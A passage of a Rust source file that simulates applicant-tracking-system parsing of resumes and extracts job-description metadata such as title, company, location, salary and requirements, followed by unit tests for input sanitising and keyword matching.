                        return Some((phone, i));
                    }
                }
            }
            i = run_start + 1;
            continue;
        }
        i += 1;
    }
    None
}

fn extract_contact_info(content: &str) -> AtsContactInfo {
    let email = extract_email(content);
    let links = extract_links(content);
    let mut name = None;
    for line in content.lines().take(12) {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if extract_email(trimmed).is_some() {
            continue;
        }
        if trimmed.contains("http://") || trimmed.contains("https://") {
            continue;
        }
        let digits = trimmed.chars().filter(|c| c.is_ascii_digit()).count();
        if digits > 3 {
            continue;
        }
        let words: Vec<&str> = trimmed.split_whitespace().collect();
        if words.is_empty() || words.len() > 5 {
            continue;
        }
        name = Some(trimmed.to_string());
        break;
    }
    let phone = extract_phone_candidate(content, 0).map(|(phone, _)| phone);
    AtsContactInfo {
        name,
        email,
        phone,
        links,
    }
}

fn detect_parse_sections(content: &str) -> Vec<AtsParsedSection> {
    let mut bodies: HashMap<&'static str, usize> = SECTION_DEFS
        .iter()
        .map(|def| (def.canonical, 0))
        .collect();
    let mut detected: std::collections::HashSet<&'static str> = Default::default();
    let mut current: Option<&'static str> = None;
    for line in content.split('\n') {
        match header_canonical(line) {
            Some(canonical) => {
                detected.insert(canonical);
                current = Some(canonical);
            }
            None => {
                if let Some(canonical) = current {
                    *bodies.entry(canonical).or_insert(0) += line.chars().count();
                }
            }
        }
    }
    SECTION_DEFS
        .iter()
        .map(|def| AtsParsedSection {
            name: def.canonical.to_string(),
            detected: detected.contains(def.canonical),
            content_chars: bodies.get(def.canonical).copied().unwrap_or(0),
        })
        .collect()
}

const EXOTIC_ALLOWED_PUNCT: &[char] = &[
    '.', ',', ';', ':', '!', '?', '(', ')', '[', ']', '{', '}', '\'', '"',
    '-', '_', '&', '/', '+', '#', '@', '=', '|', '%', '$', '\u{20ac}',
    '\u{a3}', '~', '<', '>', '\\', '`', '*', '^',
];

fn has_exotic_symbols(content: &str) -> bool {
    content.chars().any(|ch| {
        !(ch.is_whitespace()
            || ch.is_alphabetic()
            || ch.is_numeric()
            || EXOTIC_ALLOWED_PUNCT.contains(&ch))
    })
}

/// Simulate how an applicant tracking system parses `content`.
pub fn simulate_ats_parsing(content: &str, system: AtsSystemId) -> AtsParseReport {
    let rules = ats_rules_for(system);
    let clamped = clamp_ats_input(content);
    let plain = format_for_ats(&clamped, system);
    let sections = detect_parse_sections(&clamped);

    let mut warnings: Vec<String> = Vec::new();
    if clamped.contains('|') || clamped.contains('\t') {
        warnings.push(
            "Tables or tabs detected: multi-column layouts often fail to parse correctly in legacy ATS (Taleo, Jobvite).".to_string(),
        );
    }
    if has_exotic_symbols(&clamped) {
        warnings.push(
            "Special characters or icons detected: they may be replaced by substitution characters in text-only parsers.".to_string(),
        );
    }
    if clamped.lines().any(|line| line.chars().count() > 120) {
        warnings.push(
            "Very long lines detected: some older parsers truncate long lines.".to_string(),
        );
    }

    let detected_names: std::collections::HashSet<&str> = sections
        .iter()
        .filter(|s| s.detected)
        .map(|s| s.name.as_str())
        .collect();
    let mut missing_required_sections: Vec<String> = rules
        .required_sections
        .iter()
        .filter(|required| !detected_names.contains(*required))
        .map(|required| required.to_string())
        .collect();
    missing_required_sections.sort();

    AtsParseReport {
        system: system.as_str().to_string(),
        sections,
        missing_required_sections,
        contact_info: extract_contact_info(&clamped),
        warnings,
        input_chars: clamped.chars().count(),
        plain_text_chars: plain.chars().count(),
    }
}

// ---------------------------------------------------------------------------
// JD metadata extraction
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum ExperienceLevel {
    Entry,
    Mid,
    Senior,
    Lead,
    Executive,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct SalaryRange {
    pub min: f64,
    pub max: f64,
    pub currency: String,
}

#[derive(Debug, Clone, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct JdRequirements {
    pub must_have: Vec<String>,
    pub preferred: Vec<String>,
    pub bonus_skills: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct JdMetadata {
    pub job_title: Option<String>,
    pub company: Option<String>,
    pub location: Option<String>,
    pub posted_date: Option<String>,
    pub salary_range: Option<SalaryRange>,
    pub salary_summary: Option<String>,
    pub benefits: Vec<String>,
    pub culture_keywords: Vec<String>,
    pub experience_level: Option<ExperienceLevel>,
    pub requirements: JdRequirements,
}

const PROFESSION_SUFFIXES: &[&str] = &[
    "engineer",
    "developer",
    "manager",
    "analyst",
    "specialist",
    "director",
    "lead",
    "senior",
    "junior",
];

const TITLE_LABELS: &[&str] = &["position", "role", "title", "job"];

/// Byte-offset of the first ASCII-case-insensitive occurrence of `needle` in
/// `hay` (char-boundary safe; needles are ASCII constants).
fn find_ci(hay: &str, needle: &str) -> Option<usize> {
    let needle_chars: Vec<char> = needle.chars().collect();
    if needle_chars.is_empty() {
        return Some(0);
    }
    let hay_lower = hay.to_lowercase();
    // to_lowercase can change lengths for some Unicode; fall back to a
    // char-wise scan when offsets could diverge.
    if hay_lower.len() == hay.len() && hay.is_char_boundary(0) {
        return hay_lower.find(&needle.to_lowercase());
    }
    let first = needle_chars[0].to_lowercase().next().unwrap_or(needle_chars[0]);
    for (start, ch) in hay.char_indices() {
        if !ch.to_lowercase().eq(std::iter::once(first)) {
            continue;
        }
        let mut matched = true;
        for (offset, expected) in needle_chars.iter().enumerate() {
            match hay[start..].chars().nth(offset) {
                Some(actual)
                    if actual
                        .to_lowercase()
                        .eq(expected.to_lowercase()) => {}
                _ => {
                    matched = false;
                    break;
                }
            }
        }
        if matched {
            return Some(start);
        }
    }
    None
}

/// Word tokens of `text` with their byte-start offsets.
fn word_spans(text: &str) -> Vec<(usize, &str)> {
    let mut spans = Vec::new();
    let mut start: Option<usize> = None;
    for (index, ch) in text.char_indices() {
        if ch.is_whitespace() {
            if let Some(begin) = start.take() {
                spans.push((begin, &text[begin..index]));
            }
        } else if start.is_none() {
            start = Some(index);
        }
    }
    if let Some(begin) = start {
        spans.push((begin, &text[begin..]));
    }
    spans
}

fn truncate_clause(title: &str) -> Option<String> {
    // Cut at clause starters (" who / which / that / with / to "), then cap
    // 8 words and 80 chars (mirrors the TS post-processing).
    let spans = word_spans(title);
    let mut cut = title.len();
    for (index, (start, token)) in spans.iter().enumerate() {
        if index == 0 {
            continue;
        }
        let bare = token.trim_end_matches([',', ';', ':']).to_lowercase();
        if matches!(bare.as_str(), "who" | "which" | "that" | "with" | "to") {
            cut = *start;
            break;
        }
    }
    let clause = title[..cut].trim();
    let words: Vec<&str> = clause.split_whitespace().take(8).collect();
    if words.is_empty() {
        return None;
    }
    Some(words.join(" ").chars().take(80).collect::<String>().trim().to_string())
}


/// ASCII-case-insensitive prefix test that never slices on non-boundaries.
fn starts_with_ci(hay: &str, needle: &str) -> bool {
    let mut hay_chars = hay.chars();
    for expected in needle.chars() {
        match hay_chars.next() {
            Some(actual) => {
                if !actual.to_lowercase().eq(expected.to_lowercase()) {
                    return false;
                }
            }
            None => return false,
        }
    }
    true
}

/// Labeled line after `label`: expects whitespace and/or ':' then content.
fn labeled_value<'a>(text: &'a str, label: &str) -> Option<&'a str> {
    let rel = find_ci(text, label)?;
    let after = &text[rel + label.len()..];
    let had_separator = after.starts_with(':')
        || after.starts_with(|c: char| c.is_whitespace());
    if !had_separator {
        return None;
    }
    let value = after.trim_start().trim_start_matches(':').trim_start();
    let end = value.find('\n').unwrap_or(value.len()).min(value.len());
    let line = value[..end].trim();
    if line.is_empty() {
        None
    } else {
        Some(line)
    }
}

fn extract_job_title(text: &str) -> Option<String> {
    // Pattern 1: labeled line ("Position: Senior Platform Engineer").
    for label in TITLE_LABELS {
        if let Some(line) = labeled_value(text, label) {
            if let Some(title) = truncate_clause(line) {
                return Some(title);
            }
        }
    }
    // Pattern 2: prose markers ("looking for|seeking|hiring" + phrase).
    for marker in ["looking for", "seeking", "hiring"] {
        if let Some(pos) = find_ci(text, marker) {
            let after = text[pos + marker.len()..].trim_start();
            let after = strip_article(after);
            if let Some(title) = profession_phrase(after) {
                if let Some(cut) = truncate_clause(&title) {
                    return Some(cut);
                }
            }
        }
    }
    // Pattern 3: anchored at start of text.
    profession_phrase(text).and_then(|title| truncate_clause(&title))
}

fn strip_article(text: &str) -> &str {
    for article in ["an", "a"] {
        if starts_with_ci(text, &format!("{article} ")) {
            return text[article.len()..].trim_start();
        }
    }
    text
}

/// Collect the contiguous letter/space run from the start of `text`; capture
/// from the first word through the LAST word ending in a profession suffix.
fn profession_phrase(text: &str) -> Option<String> {
    let run_end = text
        .char_indices()
        .find(|(_, ch)| !(ch.is_alphabetic() || *ch == ' '))
        .map(|(idx, _)| idx)
        .unwrap_or(text.len());
    let run = &text[..run_end];
    let words: Vec<&str> = run.split(' ').filter(|w| !w.is_empty()).collect();
    if words.is_empty() {
        return None;
    }
    for end_index in (0..words.len()).rev() {
        let word = words[end_index].to_lowercase();
        if PROFESSION_SUFFIXES.iter().any(|suffix| word.ends_with(suffix)) {
            return Some(words[..=end_index].join(" "));
        }
    }
    None
}

fn extract_company(text: &str) -> Option<String> {
    // Prefer "<ProperNoun> is/seeks/looking" over the labeled-line capture,
    // which upstream kept verbatim including the trailing clause.
    let bytes = text.as_bytes();
    for (index, ch) in text.char_indices() {
        if !ch.is_ascii_uppercase() {
            continue;
        }
        if index > 0 && (bytes[index - 1].is_ascii_alphanumeric()) {
            continue;
        }
        // Extend consecutive Proper Words.
        let mut cursor = index;
        let mut end;
        loop {
            end = text[cursor..]
                .find(|c: char| !(c.is_alphanumeric() || matches!(c, '.' | '&' | '\'')))
                .map(|rel| cursor + rel)
                .unwrap_or(text.len());
            if text[end..].starts_with(' ') {
                let rest = &text[end + 1..];
                if rest
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_uppercase())
                {
                    cursor = end + 1;
                    continue;
                }
            }
            break;
        }
        // Optional comma, then verb.
        let after = text[end..].trim_start();
        let after = after.strip_prefix(',').map(str::trim_start).unwrap_or(after);
        for verb in ["is", "seeks", "looking"] {
            if starts_with_ci(after, &format!("{verb} ")) {
                return Some(text[index..end].trim().chars().take(80).collect());
            }
        }
    }
    // Fallback: labeled line, truncated at a clause starter.
    for label in ["company", "organization", "employer"] {
        if let Some(line) = labeled_value(text, label) {
            let cut = [" is", " seeks", " looking", " we're", " we are"]
                .iter()
                .filter_map(|needle| find_ci(line, needle))
                .min();
            let phrase = match cut {
                Some(pos) => &line[..pos],
                None => line,
            };
            let name: Vec<&str> = phrase.split_whitespace().take(6).collect();
            if !name.is_empty() {
                return Some(name.join(" ").chars().take(80).collect());
            }
        }
    }
    None
}

const US_STATES: &[&str] = &[
    "CA", "NY", "TX", "FL", "IL", "PA", "OH", "GA", "NC", "MI", "NJ", "VA",
    "WA", "AZ", "MA", "TN", "IN", "MO", "MD", "WI", "CO", "MN", "SC", "AL",
    "LA", "KY", "OR", "OK", "CT", "IA", "AR", "UT", "NV", "MS", "KS", "NM",
    "NE", "WV", "ID", "HI", "NH", "ME", "RI", "MT", "DE", "SD", "ND", "AK",
    "VT", "WY", "DC",
];

fn extract_location(text: &str) -> Option<String> {
    // Labeled line wins: "Location: Remote (US)".
    for label in ["location", "based in", "office in"] {
        if let Some(line) = labeled_value(text, label) {
            let taken = line.split("  ").next().unwrap_or(line).trim();
            if !taken.is_empty() {
                return Some(taken.chars().take(80).collect());
            }
        }
    }
    // "<in|at> City Name, ST" — leftmost state mention wins.
    let mut best: Option<(usize, String)> = None;
    for state in US_STATES {
        let pattern = format!(", {state}");
        let mut search_from = 0usize;
        while let Some(rel) = text[search_from..].find(&pattern) {
            let abs = search_from + rel;
            // Walk back over up to 4 capitalized city words; the run must be
            // introduced by "in"/"at".
            let spans = word_spans(&text[..abs]);
            let mut city_words: Vec<(usize, &str)> = Vec::new();
            for (start, token) in spans.iter().rev() {
                let first_cap = token
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_uppercase());
                let city_like = first_cap
                    && token.chars().all(|c| c.is_alphabetic() || c == '.')
                    && token.len() > 1;
                if city_like && city_words.len() < 4 {
                    city_words.push((*start, token));
                } else {
                    break;
                }
            }
            if !city_words.is_empty() {
                let last_start = city_words.last().map(|(s, _)| *s).unwrap_or(abs);
                let before_city = text[..last_start].trim_end();
                let connector_ok = [" in", " at", "\tin", "\tat"]
                    .iter()
                    .any(|c| before_city.to_lowercase().ends_with(c));
                if connector_ok {
                    let combined = format!("{}, {}", text[last_start..abs].trim(), state);
                    if best.as_ref().map_or(true, |(pos, _)| abs < *pos) {
                        best = Some((abs, combined));
                    }
                }
            }
            search_from = abs + pattern.len();
        }
    }
    if let Some((_, found)) = best {
        return Some(found.chars().take(80).collect());
    }
    if count_boundary_hits(text, "remote") > 0 {
        return Some("Remote".to_string());
    }
    if count_boundary_hits(text, "hybrid") > 0 {
        return Some("Hybrid".to_string());
    }
    None
}

fn parse_money(raw: &str) -> Option<f64> {
    let cleaned = raw.replace(',', "").to_lowercase();
    let multiplier = if cleaned.ends_with('k') { 1000.0 } else { 1.0 };
    let digits = cleaned.trim_end_matches('k');
    let num: f64 = digits.parse().ok()?;
    if !num.is_finite() {
        return None;
    }
    Some(num * multiplier)
}

struct AmountHit {
    start: usize,
    end: usize,
    currency_before: Option<char>,
    value: f64,
}

fn scan_amounts(text: &str) -> Vec<AmountHit> {
    let bytes = text.as_bytes();
    let mut hits = Vec::new();
    let mut i = 0usize;
    while i < bytes.len() {
        if !bytes[i].is_ascii_digit() {
            i += 1;
            continue;
        }
        // Amount: 1-3 digits, then ("," 3digits)*, optional k/K.
        let start_num = i;
        let mut end = i;
        while end < bytes.len() && bytes[end].is_ascii_digit() {
            end += 1;
        }
        if end - start_num > 3 {
            i = end;
            continue;
        }
        let mut amount_end = end;
        while amount_end + 4 <= bytes.len()
            && bytes[amount_end] == b','
            && bytes[amount_end + 1..amount_end + 4]
                .iter()
                .all(|b| b.is_ascii_digit())
        {
            amount_end += 4;
        }
        let mut final_end = amount_end;
        let mut had_k = false;
        if amount_end < bytes.len() && (bytes[amount_end] == b'k' || bytes[amount_end] == b'K') {
            final_end = amount_end + 1;
            had_k = true;
        }
        let raw = &text[start_num..amount_end];
        if let Some(mut value) = parse_money(raw) {
            if had_k {
                value *= 1000.0;
            }
            let currency_before = if start_num > 0 {
                let prev = text[..start_num].chars().next_back().unwrap_or(' ');
                if matches!(prev, '$' | '\u{a3}' | '\u{20ac}') {
                    Some(prev)
                } else {
                    None
                }
            } else {
                None
            };
            hits.push(AmountHit {
                start: start_num,
                end: final_end,
                currency_before,
                value,
            });
        }
        i = final_end.max(start_num + 1);
    }
    hits
}

fn gap_is_dash(gap: &str) -> bool {
    // Strip whitespace and currency symbols anywhere; whatever remains must
    // be a pure dash run (" - ", "--$€", "–" …).
    let residual: String = gap
        .replace(['\u{2013}', '\u{2014}'], "-")
        .chars()
        .filter(|ch| !matches!(ch, '$' | '\u{a3}' | '\u{20ac}') && !ch.is_whitespace())
        .collect();
    !residual.is_empty() && residual.chars().all(|ch| ch == '-')
}

fn extract_salary_range(text: &str) -> Option<SalaryRange> {
    let amounts = scan_amounts(text);
    for window in amounts.windows(2) {
        let (a, b) = (&window[0], &window[1]);
        let gap = &text[a.end..b.start];
        // Allow an optional repeated currency symbol inside the gap.
        let gap_normalized = gap
            .trim()
            .trim_start_matches(['$', '\u{a3}', '\u{20ac}'])
            .trim();
        if !gap_is_dash(gap_normalized) {
            continue;
        }
        let currency = a
            .currency_before
            .or(b.currency_before)
            .unwrap_or('$')
            .to_string();
        // Fix: never report an inverted range.
        if b.value < a.value {
            continue;
        }
        return Some(SalaryRange {
            min: a.value,
            max: b.value,
            currency,
        });
    }
    None
}

const BENEFITS_LEXICON: &[&str] = &[
    "401(k)",
    "401k",
    "pension",
    "equity",
    "stock options",
    "unlimited pto",
    "vacation",
    "health insurance",
    "dental",
    "vision",
    "remote",
    "hybrid",
    "flex hours",
    "gym",
    "stipend",
];

fn extract_benefits(text: &str) -> Vec<String> {
    let lower = text.to_lowercase();
    BENEFITS_LEXICON
        .iter()
        .filter(|benefit| {
            if benefit.contains('(') || benefit.contains(' ') {
                lower.contains(*benefit)
            } else {
                count_boundary_hits(&lower, benefit) > 0
            }
        })
        .map(|benefit| benefit.to_string())
        .collect()
}

const CULTURE_LEXICON: &[&str] = &[
    "fast-paced",
    "collaborative",
    "innovative",
    "ownership",
    "growth mindset",
    "customer-centric",
    "agile",
    "startup",
    "diverse",
    "inclusive",
    "remote-first",
    "data-driven",
];

fn extract_culture_keywords(text: &str) -> Vec<String> {
    let lower = text.to_lowercase();
    CULTURE_LEXICON
        .iter()
        .filter(|keyword| lower.contains(*keyword))
        .map(|keyword| keyword.to_string())
        .collect()
}

const REQUIREMENT_BUCKETS: &[(&str, &[&str])] = &[
    (
        "mustHave",
        &[
            "requirements",
            "required",
            "must have",
            "must-have",
            "qualification",
            "qualifications",
            "you will need",
            "basic qualifications",
        ],
    ),
    (
        "preferred",
        &[
            "preferred",
            "nice to have",
            "nice-to-have",
            "desired",
            "preferred qualifications",
            "plus points",
        ],
    ),
    (
        "bonusSkills",
        &["bonus", "plus", "bonus points", "good to have"],
    ),
];

const MAX_REQUIREMENTS_PER_BUCKET: usize = 50;

/// Bucket bullet lines by the most recent requirement heading above them.
fn extract_requirements(text: &str) -> JdRequirements {
    let mut result = JdRequirements::default();
    let mut current: Option<&str> = None;
    for raw_line in clamp_ats_input(text).split('\n') {
        let line = raw_line.trim();
        if line.is_empty() {
            continue;
        }
        let stripped = strip_requirement_heading(line);
        if let Some((bucket, _)) = REQUIREMENT_BUCKETS
            .iter()
            .find(|(_, matchers)| {
                matchers
                    .iter()
                    .any(|matcher| stripped == *matcher || stripped.starts_with(&format!("{matcher} ")))
            })
        {
            current = Some(bucket);
            continue;
        }
        let is_bullet = line.starts_with(['\u{2022}', '*', '-', '\u{2013}', '\u{2014}', '+'])
            || {
                let chars: Vec<char> = line.chars().collect();
                let mut digits = 0usize;
                while digits < 2 && digits < chars.len() && chars[digits].is_ascii_digit() {
                    digits += 1;
                }
                digits > 0
                    && digits < chars.len()
                    && (chars[digits] == '.' || chars[digits] == ')')
                    && chars.get(digits + 1).is_some_and(|c| *c == ' ')
            };
        let bucket = match current {
            Some(bucket) => bucket,
            None => continue,
        };
        if !is_bullet {
            continue;
        }
        let content = line
            .trim_start_matches(|c: char| {
                matches!(c, '\u{2022}' | '*' | '-' | '\u{2013}' | '\u{2014}' | '+')
            })
            .trim()
            .to_string();
        let target = match bucket {
            "mustHave" => &mut result.must_have,
            "preferred" => &mut result.preferred,
            _ => &mut result.bonus_skills,
        };
        if target.len() >= MAX_REQUIREMENTS_PER_BUCKET {
            continue;
        }
        target.push(content);
    }
    result
}

/// Normalize a candidate heading line the way `headerCanonical` does, but with
/// a bounded enumeration strip (≤2 digits, one separator).
fn strip_requirement_heading(line: &str) -> String {
    let trimmed = line
        .trim_start_matches(HEADER_LEADING_STRIP)
        .trim_end_matches(HEADER_TRAILING_STRIP);
    let chars: Vec<char> = trimmed.chars().collect();
    let mut digits = 0usize;
    while digits < 2 && digits < chars.len() && chars[digits].is_ascii_digit() {
        digits += 1;
    }
    let after_enum = if digits > 0
        && digits < chars.len()
        && (chars[digits] == '.' || chars[digits] == ')')
    {
        chars[digits + 1..]
            .iter()
            .collect::<String>()
            .trim_start()
            .to_string()
    } else {
        trimmed.to_string()
    };
    after_enum.split_whitespace().collect::<Vec<_>>().join(" ").to_lowercase()
}

const EXPERIENCE_LEVEL_LADDER: &[(&str, &[&str])] = &[
    (
        "executive",
        &["executive", "vp", "vice president", "director", "head of"],
    ),
    ("lead", &["lead", "principal", "staff"]),
    ("senior", &["senior", "sr."]),
    ("mid", &["mid-level", "intermediate"]),
    (
        "entry",
        &["junior", "jr.", "entry level", "entry-level", "graduate", "intern"],
    ),
];

fn categorize_experience_level(text: &str) -> Option<ExperienceLevel> {
    let lower = text.to_lowercase();
    for (level, signals) in EXPERIENCE_LEVEL_LADDER {
        for signal in *signals {
            let hit = if signal.ends_with('.') {
                lower.contains(signal)
            } else {
                count_boundary_hits(&lower, signal) > 0
            };
            if hit {
                return match *level {
                    "executive" => Some(ExperienceLevel::Executive),
                    "lead" => Some(ExperienceLevel::Lead),
                    "senior" => Some(ExperienceLevel::Senior),
                    "mid" => Some(ExperienceLevel::Mid),
                    _ => Some(ExperienceLevel::Entry),
                };
            }
        }
    }
    None
}

fn extract_posted_date(text: &str) -> Option<String> {
    // Labelled numeric date: posted/published/date: d{1,2}/d{1,2}/d{2,4}.
    for label in ["posted", "published", "date"] {
        let Some(line) = labeled_value(text, label) else {
            continue;
        };
        let chars: Vec<char> = line.chars().collect();
        let read_digits = |chars: &[char], from: usize, max: usize| -> Option<usize> {
            let mut count = 0usize;
            while count < max
                && from + count < chars.len()
                && chars[from + count].is_ascii_digit()
            {
                count += 1;
            }
            if count > 0 {
                Some(count)
            } else {
                None
            }
        };
        let mut idx = 0usize;
        let Some(part1) = read_digits(&chars, idx, 2) else { continue };
        idx += part1;
        if !matches!(chars.get(idx), Some('/') | Some('-')) {
            continue;
        }
        idx += 1;
        let Some(part2) = read_digits(&chars, idx, 2) else { continue };
        idx += part2;
        if !matches!(chars.get(idx), Some('/') | Some('-')) {
            continue;
        }
        idx += 1;
        let Some(part3) = read_digits(&chars, idx, 4) else { continue };
        idx += part3;
        return Some(chars[..idx].iter().collect());
    }
    // "posted on March 3, 2026"
    for marker in ["posted on", "published on"] {
        if let Some(rel) = find_ci(text, marker) {
            let after = text[rel + marker.len()..].trim_start();
            let end = after.find('\n').unwrap_or(after.len()).min(40);
            let candidate = after[..end].trim();
            let words: Vec<&str> = candidate.split_whitespace().collect();
            let rest_ok = words
                .iter()
                .skip(1)
                .flat_map(|word| word.chars())
                .all(|c| c.is_ascii_digit() || c.is_ascii_punctuation() || c == ' ');
            if words.len() >= 3
                && words[0].chars().count() >= 3
                && words[0].chars().all(|c| c.is_alphabetic())
                && rest_ok
            {
                return Some(candidate.to_string());
            }
        }
    }
    None
}

fn format_salary_summary(range: &SalaryRange) -> String {
    let fmt = |value: f64| -> String {
        let int_part = value.trunc() as i64;
        let formatted = format!("{int_part}");
        // Insert thousands separators to match en-US toLocaleString.
        let mut grouped = String::new();
        let bytes = formatted.as_bytes();
        for (index, byte) in bytes.iter().enumerate() {
            if index > 0 && (bytes.len() - index) % 3 == 0 {
                grouped.push(',');
            }
            grouped.push(*byte as char);
        }
        grouped
    };
    format!(
        "{}{} - {}{}",
        range.currency,
        fmt(range.min),
        range.currency,
        fmt(range.max)
    )
}

/// Deterministic heuristic metadata extraction from a job description.
pub fn analyze_jd_metadata(jd_text: &str) -> JdMetadata {
    let clamped = clamp_ats_input(jd_text);
    let salary_range = extract_salary_range(&clamped);
    let salary_summary = salary_range.as_ref().map(format_salary_summary);
    JdMetadata {
        job_title: extract_job_title(&clamped),
        company: extract_company(&clamped),
        location: extract_location(&clamped),
        posted_date: extract_posted_date(&clamped),
        salary_range,
        salary_summary,
        benefits: extract_benefits(&clamped),
        culture_keywords: extract_culture_keywords(&clamped),
        experience_level: categorize_experience_level(&clamped),
        requirements: extract_requirements(&clamped),
    }
}

// ---------------------------------------------------------------------------
// MatchReport summary shapes (mirror the TS persisted summaries)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
pub struct AtsParsedSectionSummary {
    pub name: String,
    pub detected: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AtsParseContactSummary {
    pub name: bool,
    pub email: bool,
    pub phone: bool,
    pub link_count: usize,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AtsParseSummary {
    pub system: String,
    pub warnings: Vec<String>,
    pub sections: Vec<AtsParsedSectionSummary>,
    pub missing_required_sections: Vec<String>,
    pub contact: AtsParseContactSummary,
    pub input_chars: usize,
    pub plain_text_chars: usize,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KeywordHeatmapSectionSummary {
    pub name: String,
    pub density: f64,
    pub heat_level: HeatLevel,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct KeywordHeatmapSummary {
    pub overall_density: f64,
    pub sections: Vec<KeywordHeatmapSectionSummary>,
    pub missing_critical_keywords: Vec<String>,
    pub overused_keywords: Vec<String>,
}

fn round2(value: f64) -> f64 {
    (value * 100.0).round() / 100.0
}

pub fn summarize_ats_parse(report: &AtsParseReport) -> AtsParseSummary {
    AtsParseSummary {
        system: report.system.clone(),
        warnings: report.warnings.clone(),
        sections: report
            .sections
            .iter()
            .map(|s| AtsParsedSectionSummary {
                name: s.name.clone(),
                detected: s.detected,
            })
            .collect(),
        missing_required_sections: report.missing_required_sections.clone(),
        contact: AtsParseContactSummary {
            name: report.contact_info.name.is_some(),
            email: report.contact_info.email.is_some(),
            phone: report.contact_info.phone.is_some(),
            link_count: report.contact_info.links.len(),
        },
        input_chars: report.input_chars,
        plain_text_chars: report.plain_text_chars,
    }
}

pub fn summarize_keyword_heatmap(heatmap: &KeywordHeatmap) -> KeywordHeatmapSummary {
    KeywordHeatmapSummary {
        overall_density: round2(heatmap.overall_density),
        sections: heatmap
            .sections
            .iter()
            .map(|s| KeywordHeatmapSectionSummary {
                name: s.name.clone(),
                density: round2(s.density),
                heat_level: s.heat_level,
            })
            .collect(),
        missing_critical_keywords: heatmap.missing_critical_keywords.clone(),
        overused_keywords: heatmap.overused_keywords.clone(),
    }
}

// ---------------------------------------------------------------------------
// Tests — parity fixtures shared with resume-synthesis-ats-simulate.test.ts,
// plus adversarial cases and seeded hostile-input fuzzing.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    const PLATFORM_JD: &str = "We are hiring a Senior Platform Engineer to build scalable platforms. \
        The platform team owns Kubernetes clusters and PostgreSQL databases. \
        Platform engineers also automate deployments with Terraform.";

    #[test]
    fn clamping_strips_controls_and_normalizes_newlines() {
        assert_eq!(clamp_ats_input("a\r\nb\rc"), "a\nb\nc");
        assert_eq!(clamp_ats_input("a\u{0}b\u{7f}c"), "abc");
        assert_eq!(clamp_ats_input("\u{202e}x\u{200b}y"), "xy");
        let big = "w".repeat(ATS_MAX_INPUT_CHARS + 500);
        assert_eq!(clamp_ats_input(&big).chars().count(), ATS_MAX_INPUT_CHARS);
    }

    #[test]
    fn ats_rules_match_the_shared_table() {
        assert_eq!(ats_rules_for(AtsSystemId::Taleo).required_sections, &["experience"]);
        assert_eq!(
            ats_rules_for(AtsSystemId::Workday).required_sections,
            &["experience", "education"]
        );
        assert!(!ats_rules_for(AtsSystemId::Greenhouse).remove_formatting);
    }

    #[test]
    fn ats_system_detection() {
        let detected = detect_ats_systems("Apply through our Workday portal");
        assert_eq!(detected, vec![AtsSystemId::Workday]);
        assert_eq!(detect_ats_systems(""), vec![AtsSystemId::Generic]);
        assert_eq!(detect_ats_systems("no portals here"), vec![AtsSystemId::Generic]);
        let three = detect_ats_systems("greenhouse (lever) icims");
        assert_eq!(three.len(), 3);
    }

    #[test]
    fn markdown_stripping_matches_ts_semantics() {
        let md = "# Header\n**bold** and *italic* and `code`\n[label](https://x.dev)";
        let out = format_for_ats(md, AtsSystemId::Taleo);
        assert!(out.contains("bold"));
        assert!(out.contains("label"));
        assert!(!out.contains('*'));
        assert!(!out.contains("https://x.dev"));
    }

    #[test]
    fn plain_text_coercion_preserves_unicode_letters() {
        // Upstream obliterated these; the port must not.
        let out = format_for_ats("José García 北京", AtsSystemId::Generic);
        assert_eq!(out, "José García 北京");
    }

    #[test]
    fn rich_systems_pass_content_through() {
        let md = "# Title\n**bold**";
        assert_eq!(format_for_ats(md, AtsSystemId::Greenhouse), md);
    }

    #[test]
    fn boundary_hits_parity_with_scoring_edge_classes() {
        assert_eq!(count_boundary_hits("Go developer with Golang and go", "go"), 2);
        assert_eq!(count_boundary_hits("developer with mongodb", "go"), 0);
        assert_eq!(count_boundary_hits("Java on a JavaScript project", "java"), 1);
        assert_eq!(count_boundary_hits("skilled in C++, cpp and c++.", "c++"), 2);
        assert_eq!(count_boundary_hits("Node.js runtime", "node.js"), 1);
        // Metacharacters are inert (upstream crashed building RegExp from these).
        assert_eq!(count_boundary_hits("fully (remote) role", "(remote)"), 1);
        assert_eq!(count_boundary_hits("R&D and r", "r"), 1); // & is not an edge
        assert_eq!(count_boundary_hits("$100 to $200", "$200"), 1);
        assert_eq!(count_boundary_hits("k8s k8s k8s", "k8s"), 3); // no undercount
        assert_eq!(count_boundary_hits("", "anything"), 0);
        assert_eq!(count_boundary_hits("text", ""), 0);
    }

    #[test]
    fn jd_keyword_extraction_is_ranked_and_tiered() {
        let hits = extract_jd_keywords(PLATFORM_JD, None);
        assert_eq!(hits[0].word, "platform");
        assert_eq!(hits[0].importance, KeywordImportance::High);
        for pair in hits.windows(2) {
            assert!(pair[0].count >= pair[1].count);
        }
        let words: Vec<&str> = hits.iter().map(|h| h.word.as_str()).collect();
        assert!(!words.contains(&"with"));
        assert!(!words.contains(&"the"));
        assert!(!words.contains(&"also"));
        assert!(hits.iter().all(|h| h.word.chars().count() > 3));
    }

    #[test]
    fn keyword_extraction_handles_hyphens_limits_and_determinism() {
        let hits = extract_jd_keywords("fast-paced environment fast-paced teams", None);
        assert!(hits.iter().any(|h| h.word == "fast-paced"));
        let many: String = (0..500).map(|i| format!("skill{i} ")).collect();
        assert_eq!(extract_jd_keywords(&many, Some(25)).len(), 25);
        assert_eq!(
            extract_jd_keywords(PLATFORM_JD, None),
            extract_jd_keywords(PLATFORM_JD, None)
        );
        assert!(extract_jd_keywords("", None).is_empty());
    }
